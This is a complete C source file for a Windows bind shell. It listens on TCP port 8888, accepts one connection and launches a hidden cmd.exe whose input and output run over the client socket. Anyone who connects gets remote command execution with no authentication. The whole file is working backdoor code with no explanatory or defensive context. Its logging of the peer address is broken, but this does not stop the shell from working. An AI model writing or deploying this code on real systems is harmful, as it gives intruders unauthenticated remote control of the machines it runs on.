#include <string.h>
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>

#define zerout(obj) memset(&obj, 0, sizeof(obj));

int main()
{
	WSADATA wsaData;
	int iResult;

	SOCKET ListenSocket = INVALID_SOCKET;
	SOCKET ClientSocket = INVALID_SOCKET;

	struct addrinfo *result = NULL;
	struct addrinfo hints;

	// Initialize Winsock
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		printf("WSAStartup failed with error: %d\n", iResult);
		return 1;
	}

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	hints.ai_flags = AI_PASSIVE;

	// Resolve the server address and port
	iResult = getaddrinfo(NULL, "8888", &hints, &result);
	if ( iResult != 0 ) {
		printf("getaddrinfo failed with error: %d\n", iResult);
		WSACleanup();
		return 1;
	}

	// Create a SOCKET for connecting to server
	ListenSocket = WSASocket(result->ai_family, result->ai_socktype, result->ai_protocol, NULL, 0, 0);
	if (ListenSocket == INVALID_SOCKET) {
		printf("socket failed with error: %ld\n", WSAGetLastError());
		freeaddrinfo(result);
		WSACleanup();
		return 1;
	}

	BOOL OptVal = TRUE;
	if(setsockopt(ListenSocket, SOL_SOCKET, SO_REUSEADDR, (char*)&OptVal, sizeof(OptVal)) == SOCKET_ERROR)
	{
		printf("[-] Error setsockopt(): %d\n", WSAGetLastError());
		return 1;
	}

	iResult = bind( ListenSocket, result->ai_addr, (int)result->ai_addrlen);
	if (iResult == SOCKET_ERROR) {
		printf("bind failed with error: %d\n", WSAGetLastError());
		freeaddrinfo(result);
		closesocket(ListenSocket);
		WSACleanup();
		return 1;
	}

	freeaddrinfo(result);

	iResult = listen(ListenSocket, SOMAXCONN);
	if (iResult == SOCKET_ERROR) {
		printf("listen failed with error: %d\n", WSAGetLastError());
		closesocket(ListenSocket);
		WSACleanup();
		return 1;
	}

	SOCKADDR_IN Csaddr;
	zerout(Csaddr);
	int Csaddr_len = sizeof(Csaddr_len);
	ClientSocket = WSAAccept(ListenSocket, NULL, NULL, /*(struct sockaddr *)&Csaddr, &Csaddr_len,*/ NULL, (DWORD_PTR)NULL);
	printf("[*] Connection from : %s:%hu -> %p\n", inet_ntoa(Csaddr.sin_addr), ntohs(Csaddr.sin_port), ClientSocket);
	if (ClientSocket == INVALID_SOCKET) {
		printf("accept failed with error: %d\n", WSAGetLastError());
		closesocket(ListenSocket);
		WSACleanup();
		return 1;
	}

	STARTUPINFOA si;
	PROCESS_INFORMATION pi;
	zerout(si);
	zerout(pi);
	si.cb = sizeof(si);

	si.wShowWindow = SW_HIDE;
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	si.hStdInput = (HANDLE)ClientSocket;
	si.hStdOutput = (HANDLE)ClientSocket;
	si.hStdError = (HANDLE)ClientSocket;

	int ret = CreateProcessA(NULL, "cmd", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

	if (ret) {
		WaitForSingleObject(pi.hProcess, INFINITE);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);

		const char *str = "Shell has stopped\r\nGood bye!\r\n";
		send(ClientSocket, str, strlen(str), 0);
	} else {
		const char *str = "Can not spawn shell\r\n";
		send(ClientSocket, str, strlen(str), 0);
	}

	iResult = shutdown(ClientSocket, SD_SEND);
	if (iResult == SOCKET_ERROR) {
		printf("shutdown failed with error: %d\n", WSAGetLastError());
		closesocket(ClientSocket);
		WSACleanup();
		return 1;
	}

	closesocket(ClientSocket);
	WSACleanup();

	closesocket(ListenSocket);

	return 0;
}
